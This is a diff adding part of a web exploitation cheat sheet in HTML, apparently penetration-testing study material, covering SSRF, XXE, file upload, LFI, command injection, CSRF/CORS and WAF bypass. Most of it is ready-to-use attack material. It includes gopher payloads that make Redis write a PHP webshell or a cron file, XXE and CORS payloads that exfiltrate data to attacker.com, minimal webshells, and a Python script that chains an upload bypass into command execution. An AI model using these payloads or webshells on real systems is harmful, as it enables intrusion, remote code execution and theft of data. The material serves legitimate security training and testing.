+%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a
+*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a
+*1%0d%0a$4%0d%0aSAVE%0d%0a
+
+# FastCGI gopher payload (PHP-FPM RCE)
+# Craft a FastCGI request that sets PHP_VALUE to auto_prepend_file
+# and SCRIPT_FILENAME to an existing PHP file</code></pre>
+
+              <h3 id="ssrf-to-rce">7.5 SSRF to RCE</h3>
+              <pre><code class="language-bash"># Via Redis (default no auth on port 6379)
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a&lt;?php system($_GET['c']); ?&gt;%0a%0a%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
+
+# Via internal admin panels (Jenkins, Kubernetes API, etc.)
+http://127.0.0.1:8080/script  # Jenkins script console
+http://127.0.0.1:10250/run/default/pod/container  # Kubelet
+
+# Via AWS credentials -&gt; RCE on other services
+# Steal IAM creds via metadata, then use them to access S3, Lambda, EC2, etc.</code></pre>
+
+              <!-- ============================================================ -->
+              <!-- Section 8: XXE                                               -->
+              <!-- ============================================================ -->
+              <h2 id="xxe">8. XXE</h2>
+              <p>XML External Entity injection exploits XML parsers that process DTD declarations. If the parser resolves external entities, attackers can read local files, perform SSRF, or exfiltrate data out-of-band.</p>
+
+              <h3 id="xxe-basic">8.1 Basic XXE</h3>
+              <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;</code></pre>
+
+              <h3 id="xxe-blind">8.2 Blind XXE (Out-of-Band)</h3>
+              <p>When the entity value is not reflected in the response, use an external DTD hosted on your server to exfiltrate data via HTTP.</p>
+              <pre><code class="language-xml">&lt;!-- Payload sent to target --&gt;
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %xxe;
+]&gt;
+&lt;root&gt;&lt;data&gt;test&lt;/data&gt;&lt;/root&gt;</code></pre>
+              <pre><code class="language-xml">&lt;!-- evil.dtd hosted on attacker server --&gt;
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'&gt;"&gt;
+%eval;
+%exfil;</code></pre>
+
+              <h3 id="xxe-ssrf">8.3 XXE to SSRF</h3>
+              <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+&lt;!-- XXE to internal services --&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"&gt;
+]&gt;</code></pre>
+
+              <h3 id="xxe-file-read">8.4 XXE File Read Tricks</h3>
+              <pre><code class="language-xml">&lt;!-- PHP base64 wrapper (avoids XML parsing errors with special chars) --&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+&lt;!-- Read source code --&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;
+]&gt;
+
+&lt;!-- Windows file read --&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"&gt;
+]&gt;
+
+&lt;!-- Java jar protocol for directory listing --&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "jar:file:///path/to/file.jar!/META-INF/MANIFEST.MF"&gt;
+]&gt;</code></pre>
+
+              <h3 id="xxe-to-rce">8.5 XXE to RCE</h3>
+              <pre><code class="language-bash"># PHP expect:// wrapper (if installed)
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "expect://id"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+# Via file write + webshell (PHP)
+# 1. Read source to find writable directory via XXE
+# 2. Write webshell via SSRF or another chain
+
+# Via SSRF to internal service (Jenkins, etc.)
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8080/script?script=println+'id'.execute().text"&gt;
+]&gt;
+
+# Via .NET DTD processing + XSLT
+# If the XML parser also processes XSLT, inject &lt;xsl:value-of select="system-property('xsl:vendor')"&gt;</code></pre>
+
+              <h3 id="xxe-filter-bypass">8.6 Filter Bypass</h3>
+              <table class="custom-table">
+                <thead><tr><th>Filter</th><th>Bypass</th></tr></thead>
+                <tbody>
+                  <tr><td>Blocks <code>ENTITY</code></td><td>Use UTF-16 encoding: <code>&lt;?xml version="1.0" encoding="UTF-16"?&gt;</code></td></tr>
+                  <tr><td>Blocks <code>SYSTEM</code></td><td>Use <code>PUBLIC</code>: <code>&lt;!ENTITY xxe PUBLIC "x" "http://..."&gt;</code></td></tr>
+                  <tr><td>Blocks <code>file://</code></td><td>Use <code>php://filter</code>, <code>jar://</code>, or <code>netdoc://</code> (Java)</td></tr>
+                  <tr><td>Content-Type check</td><td>Change <code>application/json</code> to <code>application/xml</code> and XML-ify the body</td></tr>
+                  <tr><td>XML parser hardened</td><td>Try XInclude: <code>&lt;xi:include href="file:///etc/passwd"/&gt;</code></td></tr>
+                  <tr><td>SVG upload</td><td>Embed XXE payload inside SVG (which is XML)</td></tr>
+                </tbody>
+              </table>
+              <pre><code class="language-xml">&lt;!-- XInclude (when you don't control the full XML document) --&gt;
+&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;xi:include parse="text" href="file:///etc/passwd"/&gt;
+&lt;/foo&gt;
+
+&lt;!-- XXE in SVG upload --&gt;
+&lt;?xml version="1.0" standalone="yes"?&gt;
+&lt;!DOCTYPE svg [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;
+]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"&gt;
+  &lt;text x="10" y="20"&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
+
+              <!-- ============================================================ -->
+              <!-- Section 9: File Upload & LFI                                 -->
+              <!-- ============================================================ -->
+              <h2 id="file-upload-lfi">9. File Upload &amp; LFI</h2>
+              <p>File upload and local file inclusion are often chained together: upload a file with embedded code, then include or execute it via an LFI or direct access to the upload path.</p>
+
+              <h3 id="upload-bypass">9.1 Upload Bypass Techniques</h3>
+              <table class="custom-table">
+                <thead><tr><th>Check</th><th>Bypass</th></tr></thead>
+                <tbody>
+                  <tr><td>Extension blacklist</td><td><code>.php5</code>, <code>.phtml</code>, <code>.phar</code>, <code>.php7</code>, <code>.PhP</code> (case), <code>.php.</code> (trailing dot), <code>.php%00.jpg</code> (null byte)</td></tr>
+                  <tr><td>Extension whitelist</td><td><code>shell.php.jpg</code> (double extension if Apache misconfigured), <code>shell.php;.jpg</code> (IIS semicolon)</td></tr>
+                  <tr><td>Content-Type check</td><td>Set <code>Content-Type: image/jpeg</code> while uploading PHP file</td></tr>
+                  <tr><td>Magic bytes check</td><td>Prepend <code>GIF89a</code> or JPEG header bytes (<code>\xff\xd8\xff</code>) to PHP file</td></tr>
+                  <tr><td>Image re-encoding</td><td>Embed PHP in EXIF data or image comment that survives reprocessing</td></tr>
+                  <tr><td>Size limit</td><td>Minimal webshell: <code>&lt;?=`$_GET[c]`?&gt;</code> (17 bytes)</td></tr>
+                  <tr><td>.htaccess upload</td><td>Upload <code>.htaccess</code> with <code>AddType application/x-httpd-php .jpg</code></td></tr>
+                  <tr><td>Race condition</td><td>File briefly exists before validation deletes it; access during the window</td></tr>
+                </tbody>
+              </table>
+              <pre><code class="language-bash"># Minimal PHP webshells
+&lt;?php system($_GET['c']); ?&gt;
+&lt;?=`$_GET[c]`?&gt;
+&lt;?php echo shell_exec($_REQUEST['c']); ?&gt;
+
+# GIF header bypass
+echo -e 'GIF89a&lt;?php system($_GET["c"]); ?&gt;' &gt; shell.php.gif
+
+# .htaccess trick
+echo 'AddType application/x-httpd-php .jpg' &gt; .htaccess
+# Now upload shell.jpg containing PHP code
+
+# JPEG with embedded PHP (in EXIF comment)
+exiftool -Comment='&lt;?php system($_GET["c"]); ?&gt;' photo.jpg
+mv photo.jpg shell.php.jpg</code></pre>
+
+              <h3 id="lfi-to-rce">9.2 LFI to RCE</h3>
+              <pre><code class="language-bash"># Basic LFI
+http://target/page.php?file=../../../../etc/passwd
+http://target/page.php?file=....//....//....//etc/passwd  # bypass ../ filter
+
+# Null byte termination (PHP &lt; 5.3.4)
+http://target/page.php?file=../../../../etc/passwd%00
+
+# PHP wrappers
+# Base64 encode source code:
+http://target/page.php?file=php://filter/convert.base64-encode/resource=config.php
+# Execute PHP from POST body:
+curl -X POST "http://target/page.php?file=php://input" -d "&lt;?php system('id'); ?&gt;"
+# Data wrapper:
+http://target/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
+
+# Log poisoning
+# 1. Inject PHP into access log via User-Agent
+curl -A "&lt;?php system(\$_GET['c']); ?&gt;" http://target/
+# 2. Include the log file
+http://target/page.php?file=../../../../var/log/apache2/access.log&amp;c=id
+
+# /proc/self/environ
+http://target/page.php?file=../../../../proc/self/environ
+# Inject PHP via User-Agent header (appears in environ)
+
+# Session file inclusion (PHP sessions stored as files)
+# 1. Set session variable to PHP code
+# 2. Include: /tmp/sess_&lt;PHPSESSID&gt; or /var/lib/php/sessions/sess_&lt;PHPSESSID&gt;</code></pre>
+
+              <h3 id="lfi-windows">9.3 LFI on Windows</h3>
+              <pre><code class="language-bash"># Windows-specific LFI paths
+http://target/page.asp?file=....\\....\\....\\windows\\win.ini
+http://target/page.asp?file=..%5c..%5c..%5cwindows%5cwin.ini
+
+# IIS log poisoning
+# Default IIS log: C:\inetpub\logs\LogFiles\W3SVC1\u_exNNNNNN.log
+# Inject into User-Agent, then include the log
+
+# Windows temp files
+C:\Windows\Temp\
+C:\Users\&lt;user&gt;\AppData\Local\Temp\
+
+# Interesting Windows files
+C:\inetpub\wwwroot\web.config
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+C:\Windows\repair\SAM
+C:\Windows\repair\SYSTEM
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\mysql\bin\my.ini
+C:\xampp\php\php.ini
+C:\Users\Administrator\.ssh\id_rsa</code></pre>
+
+              <h3 id="upload-exploitation">9.4 Upload to Webshell Chain</h3>
+              <pre><code class="language-python">#!/usr/bin/env python3
+"""Automated upload bypass + webshell chain"""
+import requests
+
+TARGET = "http://target"
+s = requests.Session()
+s.verify = False
+
+# Step 1: Login
+s.post(f"{TARGET}/login", data={"user": "admin", "pass": "admin"})
+
+# Step 2: Upload with extension bypass
+webshell = b'GIF89a&lt;?php system($_GET["c"]); ?&gt;'
+files = {'file': ('shell.php.jpg', webshell, 'image/jpeg')}
+r = s.post(f"{TARGET}/upload", files=files)
+print(f"[*] Upload response: {r.status_code}")
+
+# Step 3: Find upload path (parse response or guess)
+upload_path = "/uploads/shell.php.jpg"
+
+# Step 4: Execute command
+r = s.get(f"{TARGET}{upload_path}", params={"c": "id"})
+print(f"[+] Command output: {r.text}")</code></pre>
+
+              <h3 id="path-traversal">9.5 Path Traversal</h3>
+              <pre><code class="language-bash"># Standard traversal
+../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd     # double URL encode
+....//....//....//etc/passwd            # bypass ../ removal
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd # overlong UTF-8
+
+# Windows paths
+..\..\..\windows\system32\drivers\etc\hosts
+..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
+
+# Interesting files to read
+/etc/passwd
+/etc/shadow
+/home/user/.ssh/id_rsa
+/proc/self/environ
+/proc/self/cmdline
+/var/www/html/config.php
+/var/www/html/.env
+C:\inetpub\wwwroot\web.config
+C:\Windows\System32\config\SAM</code></pre>
+
+              <!-- ============================================================ -->
+              <!-- Section 10: Command Injection                                -->
+              <!-- ============================================================ -->
+              <h2 id="command-injection">10. Command Injection</h2>
+              <p>Command injection occurs when user input is passed to OS command execution functions. In source code review, search for shell execution sinks and trace whether user data reaches them without sanitization.</p>
+
+              <h3 id="cmdi-patterns">10.1 OS Command Injection Patterns</h3>
+              <pre><code class="language-bash"># Command separators / chaining
+; id
+| id
+|| id
+&amp; id
+&amp;&amp; id
+$(id)
+`id`
+
+# Newline injection
+%0aid
+%0d%0aid
+
+# Subshell / command substitution
+$(whoami)
+`whoami`
+
+# Common vulnerable patterns in code:
+# ping -c 1 &lt;user_input&gt;
+# nslookup &lt;user_input&gt;
+# convert &lt;user_input&gt; output.png</code></pre>
+
+              <h3 id="cmdi-filter-bypass">10.2 Filter Bypass</h3>
+              <table class="custom-table">
+                <thead><tr><th>Filter</th><th>Bypass</th></tr></thead>
+                <tbody>
+                  <tr><td>Blocks spaces</td><td><code>${IFS}</code>, <code>{cat,/etc/passwd}</code>, <code>cat&lt;/etc/passwd</code>, <code>X=$'\x20'&amp;&amp;cat${X}/etc/passwd</code></td></tr>
+                  <tr><td>Blocks <code>/</code></td><td><code>${PATH:0:1}</code> (= <code>/</code>), <code>$(echo L2V0Yy9wYXNzd2Q=|base64 -d)</code></td></tr>
+                  <tr><td>Blocks keywords</td><td><code>wh''oami</code>, <code>wh\oami</code>, <code>w"h"oami</code>, <code>/???/??t /???/p??s??</code> (glob)</td></tr>
+                  <tr><td>Blocks backticks</td><td><code>$(command)</code></td></tr>
+                  <tr><td>Character blacklist</td><td>Hex: <code>$'\x63\x61\x74'</code> (= cat), Base64 decode pipe</td></tr>
+                  <tr><td>Length limit</td><td><code>&gt;a</code>, <code>&gt;b</code>, <code>ls&gt;c</code>, <code>sh c</code> (write commands to files)</td></tr>
+                </tbody>
+              </table>
+
+              <h3 id="cmdi-eval-code">10.3 Eval / Code Injection</h3>
+              <p>Code injection differs from OS command injection: the payload is interpreted by the application's language runtime, not the OS shell.</p>
+              <pre><code class="language-php">// PHP eval injection
+// Vulnerable: eval("echo " . $_GET['input'] . ";");
+// Payload: input=1;system('id')
+
+// PHP preg_replace with /e (deprecated, PHP &lt; 7)
+// Vulnerable: preg_replace('/(.*)/e', 'strtolower("\\1")', $_GET['input']);
+// Payload: input={${system('id')}}
+
+// PHP assert()
+// Vulnerable: assert($_GET['page'] . '.php');
+// Payload: page='.system("id").'</code></pre>
+              <pre><code class="language-python"># Python eval/exec injection
+# Vulnerable: eval("print(" + user_input + ")")
+# Payload: __import__('os').system('id')
+
+# Python format string injection
+# Vulnerable: "Hello {user}".format(**locals())
+# Payload: {user.__class__.__mro__[1].__subclasses__()}</code></pre>
+              <pre><code class="language-javascript">// Node.js eval injection
+// Vulnerable: eval("var x = " + userInput);
+// Payload: require('child_process').execSync('id')
+
+// Node.js Function constructor
+// Vulnerable: new Function('return ' + userInput)();
+// Payload: require('child_process').execSync('id')
+
+// Node.js vm module (sandbox escape)
+const vm = require('vm');
+vm.runInNewContext('this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()');</code></pre>
+
+              <!-- ============================================================ -->
+              <!-- Section 11: CSRF & CORS                                      -->
+              <!-- ============================================================ -->
+              <h2 id="csrf-cors">11. CSRF &amp; CORS</h2>
+              <p>Cross-Site Request Forgery forces authenticated users to perform unintended actions. CORS misconfigurations allow malicious sites to read responses from APIs they should not access.</p>
+
+              <h3 id="csrf-bypass">11.1 CSRF Token Bypass</h3>
+              <table class="custom-table">
+                <thead><tr><th>Bypass</th><th>Condition</th></tr></thead>
+                <tbody>
+                  <tr><td>Remove token entirely</td><td>Server does not validate if token is absent</td></tr>
+                  <tr><td>Empty token value</td><td>Server checks token presence but not value</td></tr>
+                  <tr><td>Reuse another user's token</td><td>Token not tied to session (global pool)</td></tr>
+                  <tr><td>Use GET instead of POST</td><td>Server accepts both methods</td></tr>
+                  <tr><td>Change Content-Type</td><td><code>application/x-www-form-urlencoded</code> instead of <code>application/json</code></td></tr>
+                  <tr><td>Token in cookie only</td><td>Double-submit pattern with subdomain cookie injection</td></tr>
+                </tbody>
+              </table>
+              <pre><code class="language-javascript">// Basic CSRF PoC (auto-submitting form)
+&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form action="http://target/change-email" method="POST"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+// CSRF with JSON body via form
+&lt;form action="http://target/api/update" method="POST" enctype="text/plain"&gt;
+  &lt;input name='{"email":"attacker@evil.com","ignore":"' value='"}' type="hidden"&gt;
+&lt;/form&gt;
+
+// CSRF via XHR (if CORS allows)
+&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://target/api/change-password");
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.withCredentials = true;
+xhr.send(JSON.stringify({password: "hacked123"}));
+&lt;/script&gt;</code></pre>
+
+              <h3 id="csrf-samesite">11.2 SameSite Bypass</h3>
+              <pre><code class="language-bash"># SameSite=Lax: cookies sent on top-level GET navigations
+# Exploit: if the action works via GET, use a link/redirect
+&lt;a href="http://target/delete-account"&gt;Click me&lt;/a&gt;
+# Or via window.open / meta redirect
+
+# SameSite=None requires Secure flag and HTTPS
+# If the site sets SameSite=None without Secure, browser ignores the cookie
+
+# Chrome treats cookies without SameSite as Lax by default
+# Exploit window: within 2 minutes of being set, Lax cookies are sent on cross-site POST
+# (Lax + POST mitigation only for the first 2 minutes)</code></pre>
+
+              <h3 id="cors-exploit">11.3 CORS Misconfiguration</h3>
+              <pre><code class="language-bash"># Test for misconfigured CORS
+curl -H "Origin: http://evil.com" -v http://target/api/user
+# Look for: Access-Control-Allow-Origin: http://evil.com
+#           Access-Control-Allow-Credentials: true
+
+# Common misconfigurations:
+# 1. Reflects any Origin header
+# 2. Allows null origin: Access-Control-Allow-Origin: null
+# 3. Regex bypass: origin check for "target.com" matches "attackertarget.com"
+# 4. Subdomain wildcard: *.target.com allows attacker-controlled subdomain</code></pre>
+              <pre><code class="language-javascript">// Exploit: steal data via CORS misconfiguration
+&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://target/api/user-data");
+xhr.withCredentials = true;
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4) {
+    // Exfiltrate the response
+    fetch("http://attacker.com/log", {
+      method: "POST",
+      body: xhr.responseText
+    });
+  }
+};
+xhr.send();
+&lt;/script&gt;
+
+// Exploit null origin (via sandboxed iframe)
+&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+  src="data:text/html,&lt;script&gt;
+    var xhr=new XMLHttpRequest();
+    xhr.open('GET','http://target/api/secrets');
+    xhr.withCredentials=true;
+    xhr.onload=function(){
+      fetch('http://attacker.com/log',{method:'POST',body:xhr.responseText});
+    };
+    xhr.send();
+  &lt;/script&gt;"&gt;
+&lt;/iframe&gt;</code></pre>
+
+              <!-- ============================================================ -->
+              <!-- Section 12: WAF Bypass                                       -->
+              <!-- ============================================================ -->
+              <h2 id="waf-bypass">12. WAF Bypass</h2>
+              <p>Web Application Firewalls inspect requests for known attack patterns. Bypassing them requires encoding tricks, HTTP quirks, and payload obfuscation that the WAF does not normalize but the application does.</p>
+
+              <h3 id="waf-encoding">12.1 Encoding Tricks</h3>
+              <table class="custom-table">
+                <thead><tr><th>Technique</th><th>Example</th></tr></thead>
+                <tbody>
+                  <tr><td>Double URL encoding</td><td><code>%2527</code> decodes to <code>%27</code> then to <code>'</code></td></tr>
+                  <tr><td>Unicode normalization</td><td><code>'</code> = <code>'</code>, <code><</code> = <code>&lt;</code></td></tr>
+                  <tr><td>Overlong UTF-8</td><td><code>%c0%af</code> = <code>/</code></td></tr>
+                  <tr><td>HTML entities</td><td><code>&amp;#39;</code> = <code>'</code>, <code>&amp;#x27;</code> = <code>'</code></td></tr>
+                  <tr><td>Mixed case</td><td><code>SeLeCt</code>, <code>UnIoN</code></td></tr>
+                  <tr><td>Null byte insertion</td><td><code>SEL%00ECT</code></td></tr>
+                  <tr><td>Hex encoding (SQL)</td><td><code>0x61646d696e</code> = <code>admin</code></td></tr>
+                  <tr><td>Concatenation</td><td><code>CONCAT(0x61,0x64,0x6d,0x69,0x6e)</code></td></tr>
+                </tbody>
+              </table>
+
+              <h3 id="waf-http-tricks">12.2 HTTP-Level Bypass</h3>
+              <pre><code class="language-bash"># HTTP Parameter Pollution (HPP)
+# Send same param twice; WAF checks first, app uses second
+POST /search HTTP/1.1
+q=safe&amp;q=' UNION SELECT password FROM users--
+
+# Content-Type confusion
+# Send JSON body with form Content-Type, or vice versa
+Content-Type: application/x-www-form-urlencoded
+{"query": "' OR 1=1--"}
+
+# Transfer-Encoding: chunked (may confuse WAF)
+Transfer-Encoding: chunked
+
+5
+' UNI
+5
+ON SE
+6
+LECT
+0
+
+# HTTP/2 header injection / CRLF
+# Some WAFs only inspect HTTP/1.1 headers
+
+# Request method override
+X-HTTP-Method-Override: PUT
+X-Method-Override: DELETE</code></pre>
+
+              <h3 id="waf-sqli-bypass">12.3 SQL Injection WAF Bypass</h3>
+              <pre><code class="language-sql">-- Comment-based obfuscation (MySQL)
+UN/**/ION SEL/**/ECT 1,2,3
+/*!50000UNION*/ /*!50000SELECT*/ 1,2,3
+
+-- Whitespace alternatives
+UNION%09SELECT%0a1,2,3     -- tab, newline
+UNION%a0SELECT 1,2,3       -- non-breaking space
+
+-- Equivalent functions
+SUBSTRING() -&gt; MID(), SUBSTR()
+ASCII() -&gt; ORD()
+BENCHMARK() -&gt; SLEEP()
+CONCAT() -&gt; CONCAT_WS()
+
+-- Scientific notation bypass
+0e0UNION SELECT 1,2,3
+
+-- No-space UNION
+-1'UNION(SELECT(1),(2),(3))--
+
+-- String without quotes (MySQL hex)
+SELECT * FROM users WHERE name=0x61646d696e
+
+-- PostgreSQL dollar-quoting
+SELECT * FROM users WHERE name=$$admin$$</code></pre>
+
+              <h3 id="waf-xss-bypass">12.4 XSS WAF Bypass</h3>
+              <pre><code class="language-bash"># Case variation
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+
+# Tag alternatives
+&lt;svg/onload=alert(1)&gt;
+&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;path id="&lt;img onerror=alert(1) src=1"&gt;
+
+# Encoding payloads
+&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&gt;
+&lt;a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)"&gt;click&lt;/a&gt;
+
+# Without parentheses
+&lt;img src=x onerror=alert`1`&gt;
+&lt;img src=x onerror=window.onerror=alert;throw+1&gt;
+
+# Without angle brackets (inside attribute context)
+" autofocus onfocus=alert(1) x="
+' onmouseover='alert(1)
+
+# JavaScript protocol variations
+javascript:alert(1)
+java%0ascript:alert(1)
+\j\a\v\a\s\c\r\i\p\t:alert(1)</code></pre>
+
+              <h3 id="waf-command-bypass">12.5 Command Injection WAF Bypass</h3>
+              <pre><code class="language-bash"># Without spaces
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+cat$IFS$9/etc/passwd
+X=$'\x20'&amp;&amp;cat${X}/etc/passwd
+cat&lt;/etc/passwd
+
+# Without slashes
+$(echo L2V0Yy9wYXNzd2Q=|base64 -d)
+# /etc/passwd
+
+# Character-at-a-time extraction from env
+${PATH:0:1}etc${PATH:0:1}passwd
+# = /etc/passwd
+
+# Without alphanumeric characters (bash)
+$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'
+# = cat /etc/passwd
+
+# Wildcards as bypass
+/???/??t /???/p??s??
+# = /bin/cat /etc/passwd
+
+# Base64 command execution
+echo "aWQ=" | base64 -d | bash
+bash -c '{echo,aWQ=}|{base64,-d}|bash'
+
+# Using environment variables
+echo ${SHELL}            # /bin/bash
+${SHELL} -c 'id'</code></pre>
+
+              <h3 id="waf-ssti-bypass">12.5.1 SSTI WAF Bypass</h3>
+              <pre><code class="language-bash"># Jinja2 without {{ }}
+{% print(config) %}
+{% if request.args.cmd %}{% endif %}
+
+# Jinja2 with hex-encoded strings
+{{ ''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1] }}
+
+# Twig without common keywords
+{{ ['id']|filter('syst'~'em') }}
+{{ ['id']|map('sys'~'tem') }}
+
+# Using concat to build dangerous strings
+{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}</code></pre>
+
+              <h3 id="waf-deserialization-bypass">12.6 Deserialization WAF Bypass</h3>
+              <table class="custom-table">
+                <thead><tr><th>Technique</th><th>Description</th></tr></thead>
+                <tbody>
+                  <tr><td>Alternative gadget chains</td><td>Use less common chains not in WAF signatures</td></tr>
+                  <tr><td>Custom wrapper classes</td><td>Nest payload inside a custom serialized wrapper</td></tr>
+                  <tr><td>Encoding variation</td><td>Base64, gzip, then base64 again</td></tr>
+                  <tr><td>Unicode in class names</td><td>Some deserializers normalize Unicode differently than WAFs</td></tr>
+                  <tr><td>Chunked transfer</td><td>Split serialized payload across HTTP chunks</td></tr>
+                  <tr><td>Content-Type mismatch</td><td>Send serialized data with unexpected Content-Type</td></tr>
+                </tbody>
+              </table>
+
+            </div><!-- .cheatsheet-content -->
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Cheatsheet Section -->
+  </main><!-- End #main -->
+
+  <!-- ======= Index ======= -->
+  <div class="index-btn" onclick="toggleIndex()">Index</div>
+  <div id="index" class="index">
+    <div class="container mt-3">
+      <div class="input-group mb-3">
+        <input type="text" id="search-input" class="form-control" placeholder="Search sections..." aria-label="Search sections" aria-describedby="search-button">
+        <button class="btn btn-primary" type="button" id="search-button">
+          <i class="bi bi-search"></i>
+        </button>
+      </div>
+    </div>
+    <button class="expand-collapse-btn" onclick="toggleAll()">Show/Hide All</button>
+
+    <div class="section-flow-1">
+      <button class="dropdown-btn">1. Source Code Review
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#scr-grep-patterns">1.1 Grep Patterns for Sinks &amp; Sources</a>
+        <a href="#scr-static-analysis">1.2 Static Analysis Tools</a>
+        <a href="#scr-vuln-patterns">1.3 Common Vulnerability Patterns</a>
+        <a href="#scr-routing">1.4 HTTP Routing Patterns</a>
+        <a href="#scr-taint-tracking">1.5 Manual Taint Tracking</a>
+        <a href="#scr-debugger-setup">1.6 Remote Debugger Setup</a>
+        <a href="#scr-language-tips">1.7 Language-Specific Tips</a>
+      </div>
+    </div>
+    <div class="section-flow-2">
+      <button class="dropdown-btn">2. Authentication Bypass
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#auth-sqli-bypass">2.1 SQLi Auth Bypass</a>
+        <a href="#auth-logic-flaws">2.2 Logic Flaws</a>
+        <a href="#auth-type-juggling">2.3 Type Juggling (PHP)</a>
+        <a href="#auth-jwt">2.4 JWT Attacks</a>
+        <a href="#auth-session-fixation">2.5 Session Fixation</a>
+        <a href="#auth-password-reset">2.6 Password Reset Flaws</a>
+        <a href="#auth-mfa-bypass">2.7 MFA Bypass</a>
+        <a href="#auth-oauth">2.8 OAuth Misconfigurations</a>
+      </div>
+    </div>
+    <div class="section-flow-3">
+      <button class="dropdown-btn">3. SQL Injection
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#sqli-union">3.1 UNION-Based SQLi</a>
+        <a href="#sqli-error">3.2 Error-Based SQLi</a>
+        <a href="#sqli-blind">3.3 Blind SQLi</a>
+        <a href="#sqli-second-order">3.4 Second-Order SQLi</a>
+        <a href="#sqli-orm">3.5 ORM Bypass</a>
+        <a href="#sqli-db-payloads">3.6 Database-Specific Payloads</a>
+        <a href="#sqli-stacked">3.7 Stacked Queries &amp; Stored Procs</a>
+        <a href="#sqli-automation">3.8 Automation with sqlmap</a>
+        <a href="#sqli-to-rce">3.9 SQLi to RCE</a>
+      </div>
+    </div>
+    <div class="section-flow-4">
+      <button class="dropdown-btn">4. Cross-Site Scripting (XSS)
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#xss-reflected">4.1 Reflected XSS</a>
+        <a href="#xss-stored">4.2 Stored XSS</a>
+        <a href="#xss-dom">4.3 DOM-Based XSS</a>
+        <a href="#xss-filter-bypass">4.4 Filter Bypass Techniques</a>
+        <a href="#xss-csp-bypass">4.5 CSP Bypass</a>
+        <a href="#xss-account-takeover">4.6 XSS to Account Takeover</a>
+      </div>
+    </div>
